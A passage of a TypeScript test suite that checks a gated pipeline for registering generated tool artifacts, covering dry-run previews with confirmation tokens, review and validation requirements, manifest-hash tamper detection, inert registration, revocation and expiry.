    expect(checkIds).toContain("dynamic_execution_reference");
  });

  it("get/list harness runs return stored results", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    expect(artifact).toBeDefined();
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const validationId = (validation.data as { validation: { validationId: string } }).validation.validationId;
    const preview = await runTool(
      getTool("forge.run_validation_harness"),
      { validationId, mode: "contract", dryRun: true },
      context
    );
    const executed = await runTool(
      getTool("forge.run_validation_harness"),
      {
        validationId,
        mode: "contract",
        confirmationToken: (preview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const harnessRunId = (executed.data as { harnessRun: { harnessRunId: string } }).harnessRun.harnessRunId;

    const getHarnessRun = await runTool(getTool("forge.get_harness_run"), { harnessRunId }, context);
    const listHarnessRuns = await runTool(getTool("forge.list_harness_runs"), { artifactId: artifact!.artifactId }, context);

    expect(getHarnessRun.ok).toBe(true);
    expect((getHarnessRun.data as { harnessRun: { harnessRunId: string } }).harnessRun.harnessRunId).toBe(harnessRunId);
    expect((listHarnessRuns.data as { harnessRuns: Array<{ harnessRunId: string }> }).harnessRuns).toEqual(
      expect.arrayContaining([expect.objectContaining({ harnessRunId })])
    );
  });

  it("registration eligibility fails without review", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash: (saved.data as { manifestHash: string }).manifestHash
    });

    const result = await runTool(
      getTool("forge.check_registration_eligibility"),
      { artifactId: artifact!.artifactId },
      context
    );

    expect(result.ok).toBe(true);
    expect((result.data as { eligible: boolean }).eligible).toBe(false);
    expect((result.data as { missingRequirements: string[] }).missingRequirements).toContain("Review record is required.");
  });

  it("registration eligibility fails without scaffold, static validation, and harness pass", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });

    const result = await runTool(
      getTool("forge.check_registration_eligibility"),
      { artifactId: artifact!.artifactId },
      context
    );

    expect(result.ok).toBe(true);
    const data = result.data as { missingRequirements: string[] };
    expect(data.missingRequirements).toContain("Scaffolded project is required.");
    expect(data.missingRequirements).toContain("Static validation must exist.");
    expect(data.missingRequirements).toContain("Harness validation must exist.");
  });

  it("registration eligibility fails on manifest hash mismatch", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    await context.forge.saveManifest({ ...validManifest, description: "tampered" }, manifestHash);

    const result = await runTool(
      getTool("forge.check_registration_eligibility"),
      { artifactId: artifact!.artifactId },
      context
    );

    expect(result.ok).toBe(true);
    expect((result.data as { missingRequirements: string[] }).missingRequirements).toContain("Manifest hash changed.");
  });

  it("registration eligibility fails when grants are missing", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const harnessPreview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "contract", dryRun: true },
      context
    );
    await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "contract",
        confirmationToken: (harnessPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });

    const result = await runTool(
      getTool("forge.check_registration_eligibility"),
      { artifactId: artifact!.artifactId },
      context
    );

    expect(result.ok).toBe(true);
    expect((result.data as { eligible: boolean }).eligible).toBe(false);
    expect((result.data as { missingRequirements: string[] }).missingRequirements).toContain(
      "Required grants must be active for the current session/profile."
    );
  });

  it("register_artifact dryRun writes nothing and actual execution creates a registered_inert record", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const harnessPreview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "contract", dryRun: true },
      context
    );
    await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "contract",
        confirmationToken: (harnessPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const grantsPreview = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );
    await runTool(
      getTool("forge.apply_session_grants_from_review"),
      {
        reviewId,
        confirmationToken: (grantsPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });

    const preview = await runTool(
      getTool("forge.register_artifact"),
      { artifactId: artifact!.artifactId, dryRun: true },
      context
    );
    expect(preview.ok).toBe(true);
    expect((await context.forge.listRegistrations()).length).toBe(0);

    const noToken = await runTool(
      getTool("forge.register_artifact"),
      { artifactId: artifact!.artifactId },
      context
    );
    expect(noToken.ok).toBe(false);
    expect(noToken.error?.code).toBe("dry_run_required");

    const execute = await runTool(
      getTool("forge.register_artifact"),
      {
        artifactId: artifact!.artifactId,
        confirmationToken: (preview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    expect(execute.ok).toBe(true);
    const data = execute.data as {
      registration: { status: string; executable: boolean; live: boolean };
      eligibility: { eligible: boolean };
    };
    expect(data.eligibility.eligible).toBe(true);
    expect(data.registration.status).toBe("registered_inert");
    expect(data.registration.executable).toBe(false);
    expect(data.registration.live).toBe(false);
    expect(context.registry.listTools().some((tool) => tool.name === "example.generated.preview")).toBe(false);
  });

  it("get/list registrations work and active registration blocks repeat registration", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const harnessPreview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "contract", dryRun: true },
      context
    );
    await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "contract",
        confirmationToken: (harnessPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const grantsPreview = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );
    await runTool(
      getTool("forge.apply_session_grants_from_review"),
      {
        reviewId,
        confirmationToken: (grantsPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    const registrationPreview = await runTool(
      getTool("forge.register_artifact"),
      { artifactId: artifact!.artifactId, dryRun: true },
      context
    );
    const registrationExecute = await runTool(
      getTool("forge.register_artifact"),
      {
        artifactId: artifact!.artifactId,
        confirmationToken: (registrationPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const registrationId = (registrationExecute.data as { registration: { registrationId: string } }).registration.registrationId;

    const getRegistration = await runTool(getTool("forge.get_registration"), { registrationId }, context);
    const listRegistrations = await runTool(
      getTool("forge.list_registrations"),
      { artifactId: artifact!.artifactId },
      context
    );
    const eligibility = await runTool(
      getTool("forge.check_registration_eligibility"),
      { artifactId: artifact!.artifactId },
      context
    );

    expect(getRegistration.ok).toBe(true);
    expect((getRegistration.data as { registration: { registrationId: string } }).registration.registrationId).toBe(
      registrationId
    );
    expect((listRegistrations.data as { registrations: Array<{ registrationId: string }> }).registrations).toEqual(
      expect.arrayContaining([expect.objectContaining({ registrationId })])
    );
    expect((eligibility.data as { eligible: boolean }).eligible).toBe(false);
  });

  it("revoke_registration dryRun writes nothing and execution marks the record revoked", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const harnessPreview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "contract", dryRun: true },
      context
    );
    await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "contract",
        confirmationToken: (harnessPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const grantsPreview = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );
    await runTool(
      getTool("forge.apply_session_grants_from_review"),
      {
        reviewId,
        confirmationToken: (grantsPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    const registerPreview = await runTool(
      getTool("forge.register_artifact"),
      { artifactId: artifact!.artifactId, dryRun: true },
      context
    );
    const registered = await runTool(
      getTool("forge.register_artifact"),
      {
        artifactId: artifact!.artifactId,
        confirmationToken: (registerPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const registrationId = (registered.data as { registration: { registrationId: string } }).registration.registrationId;

    const revokePreview = await runTool(
      getTool("forge.revoke_registration"),
      { registrationId, dryRun: true },
      context
    );
    expect(revokePreview.ok).toBe(true);

    const revoked = await runTool(
      getTool("forge.revoke_registration"),
      {
        registrationId,
        confirmationToken: (revokePreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    expect(revoked.ok).toBe(true);
    expect((revoked.data as { registration: { status: string } }).registration.status).toBe("revoked");
  });

  it("expired registrations are returned as expired", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const harnessPreview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "contract", dryRun: true },
      context
    );
    await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "contract",
        confirmationToken: (harnessPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const grantsPreview = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );
    await runTool(
      getTool("forge.apply_session_grants_from_review"),
      {
        reviewId,
        confirmationToken: (grantsPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    const registerPreview = await runTool(
      getTool("forge.register_artifact"),
      { artifactId: artifact!.artifactId, dryRun: true },
      context
    );
    const registered = await runTool(
      getTool("forge.register_artifact"),
      {
        artifactId: artifact!.artifactId,
        confirmationToken: (registerPreview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );
    const stored = (registered.data as { registration: { registrationId: string } }).registration.registrationId;
    const registration = await context.forge.loadRegistration(stored);
    await context.forge.saveRegistration({
      ...registration,
      expiresAt: "2000-01-01T00:00:00.000Z"
    });

    const getRegistration = await runTool(getTool("forge.get_registration"), { registrationId: stored }, context);
    expect((getRegistration.data as { registration: { status: string } }).registration.status).toBe("expired");
  });
});
